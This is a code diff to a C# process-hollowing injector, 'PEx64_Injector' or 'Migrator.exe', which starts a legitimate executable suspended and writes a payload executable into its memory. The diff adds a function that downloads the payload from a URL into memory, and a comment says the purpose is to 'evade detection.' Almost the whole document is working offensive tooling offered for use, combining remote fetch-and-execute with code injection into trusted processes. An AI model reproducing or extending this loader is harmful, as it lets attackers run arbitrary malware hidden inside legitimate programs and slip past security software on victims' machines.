@@ -1,14 +1,16 @@
-﻿using System;
+using System;
 using System.IO;
+using System.Net.Http;
 using System.Runtime.InteropServices;
+using System.Threading.Tasks;
 
 namespace PEx64_Injector
 {
-    //if not working make sure unsafe code is enabled from build options.
+    // Ensure unsafe code is enabled from build options.
     public static class Migrate
     {
-        //special thanks to gigajew.
-        #region dllimport
+        // Special thanks to gigajew.
+        #region DllImport
         [DllImport("kernel32.dll")]
         private static extern bool CreateProcess(string lpApplicationName,
                                                  string lpCommandLine,
@@ -71,14 +73,14 @@ namespace PEx64_Injector
 
             IntPtr pThreadContext = Allocate(0x4d0, 16);
 
-            string target_host = host;
+            string targetHost = host;
             if (!string.IsNullOrEmpty(args))
-                target_host += " " + args;
+                targetHost += " " + args;
             string currentDirectory = Directory.GetCurrentDirectory();
 
             Marshal.WriteInt32(pThreadContext, 0x30, 0x0010001b);
 
-            CreateProcess(null, target_host, IntPtr.Zero, IntPtr.Zero, true, 0x4u, IntPtr.Zero, currentDirectory, bStartupInfo, bProcessInfo);
+            CreateProcess(null, targetHost, IntPtr.Zero, IntPtr.Zero, true, 0x4u, IntPtr.Zero, currentDirectory, bStartupInfo, bProcessInfo);
             long processHandle = Marshal.ReadInt64(bProcessInfo, 0x0);
             long threadHandle = Marshal.ReadInt64(bProcessInfo, 0x8);
 
@@ -131,29 +133,64 @@ namespace PEx64_Injector
             return Align(allocated, alignment);
         }
     }
+
+    // added new feature, download the executable from url in order to evade detection.
     class Program
     {
-        static void Main(string[] args)
+        static async Task Main(string[] args)
         {
             try
             {
-                if (args.Length == 0)
+                if (args.Length < 2)
                 {
-                    Console.WriteLine("\n\n[*]Developed By 0xyg3n\n\n[!]Invalid Arguments Specified..\n\n[*]Usage: Migrator.exe payload(fpath) Migratefile(fpath)\n\n[*]Example: Migrator.exe C:\\Users\\User\\Desktop\\Putty64.exe C:\\Windows\\System32\\notepad.exe\n\n");
+                    Console.WriteLine("\n\n[*] Developed By 0xyg3n\n\n[!] Invalid Arguments Specified..\n\n[*] Usage: Migrator.exe payload(fpath or URL) migratefile(fpath)\n\n[*] Example: Migrator.exe C:\\Users\\User\\Desktop\\Putty64.exe C:\\Windows\\System32\\notepad.exe\n\n");
                     Environment.Exit(0);
                 }
                 else
                 {
-                    // The file you want to inject.
+                    // The file you want to inject (payload).
                     string payload = args[0];
-                    // The executable you want to inject to (hostfile)
+                    // The executable you want to inject to (hostfile).
                     string migratefile = args[1];
-                    string arguments = ""; // screw the args.
-                    Migrate.Load(File.ReadAllBytes(payload), migratefile, arguments);
-                    Console.WriteLine("\n\n[*]Migrated Succesfully!");
+
+                    byte[] payloadData;
+
+                    // Check if the payload is a URL or a file path
+                    if (Uri.IsWellFormedUriString(payload, UriKind.Absolute))
+                    {
+                        // Download the file directly into memory
+                        payloadData = await DownloadFileAsync(payload);
+                        Console.WriteLine("[*] Downloaded payload from URL.");
+                    }
+                    else
+                    {
+                        // Read the payload from the file
+                        payloadData = File.ReadAllBytes(payload);
+                        Console.WriteLine("[*] Loaded payload from file.");
+                    }
+
+                    string arguments = ""; // Arguments can be added if needed.
+                    Migrate.Load(payloadData, migratefile, arguments);
+                    Console.WriteLine("\n\n[*] Migrated Successfully!");
                 }
             }
-            catch (Exception ex) { Console.WriteLine("\n\n[*]Migration Failed!"); }
+            catch (Exception ex)
+            {
+                Console.WriteLine("\n\n[*] Migration Failed: " + ex.Message);
+            }
+        }
+
+        static async Task<byte[]> DownloadFileAsync(string url)
+        {
+            using (HttpClient client = new HttpClient())
+            {
+                // Send a GET request
+                HttpResponseMessage response = await client.GetAsync(url);
+                response.EnsureSuccessStatusCode(); // Throw if not a success code.
+
+                // Read the response content as a byte array
+                return await response.Content.ReadAsByteArrayAsync();
+            }
         }
     }
 }
